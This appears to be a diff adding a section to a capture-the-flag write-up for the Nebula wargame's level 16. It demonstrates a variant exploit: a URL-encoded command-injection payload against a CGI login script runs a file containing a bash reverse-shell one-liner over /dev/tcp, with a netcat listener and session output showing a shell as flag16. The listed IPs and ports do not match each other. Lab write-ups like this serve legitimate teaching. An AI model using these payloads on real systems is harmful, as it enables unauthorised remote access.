@@ -163,6 +163,47 @@ You have successfully executed getflag on a target account
 ** Once the connection is established, nc closes the listening port 444. However, connected session can continuously use the execed
 reverse shell with the privilege of flag16 **
 
+** Variant of using reverse shell **
+Ref: Bash Redirection: https://wiki.bash-hackers.org/syntax/redirection
+ 
+  - Start by listening on port
+    : When /tmp/GETSH is executed by flag16, interactive shell by nc.traditional is dropped to shell of flag16 following the close
+      of listening port 4444
+  nc.traditional -lvnp 4444
+
+  - Modify /tmp/GETSH content like below
+  #!/bin/sh
+  bash -i >& /dev/tcp/192.168.144.1/8000 0>&1
+  # -i: Interactive bash shell
+  # >& /dev/tcp/192.168.10.134/4444: Redirect Standard output and error to /dev/tcp/192.168.10.134/4444
+  #  /dev/tcp/HOST/PORT: TCP Socket
+  # 0>&1: Redirect Standard Input to Standard output
+  
+  Then run http://192.168.10.134:1616/index.cgi?username=%60%2F%2A%2FGETSH%60&password= with browser.
+  
+level16@nebula:~$ nc.traditional -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.10.134] from (UNKNOWN) [192.168.10.134] 36073
+bash: no job control in this shell
+flag16@nebula:/home/flag16$
+
+flag16@nebula:/home/flag16$ id
+id
+uid=983(flag16) gid=983(flag16) groups=983(flag16)
+flag16@nebula:/home/flag16$ getflag
+getflag
+You have successfully executed getflag on a target account
+
+flag16@nebula:/home/flag16$ pstree
+pstree
+init-+-atd
+...
+     |-sh---sh---GETSH---bash---pstree
+     |-sshd-+-sshd---sshd---sh
+     |      `-sshd---sshd---sh---nc.traditional  <== flag16 shell
+ 
+***********************************
+  
 
 Sol C - Use Bash tricks to mitigate uppercase issue (https://wiki.bash-hackers.org/syntax/pe#case_modification)
 
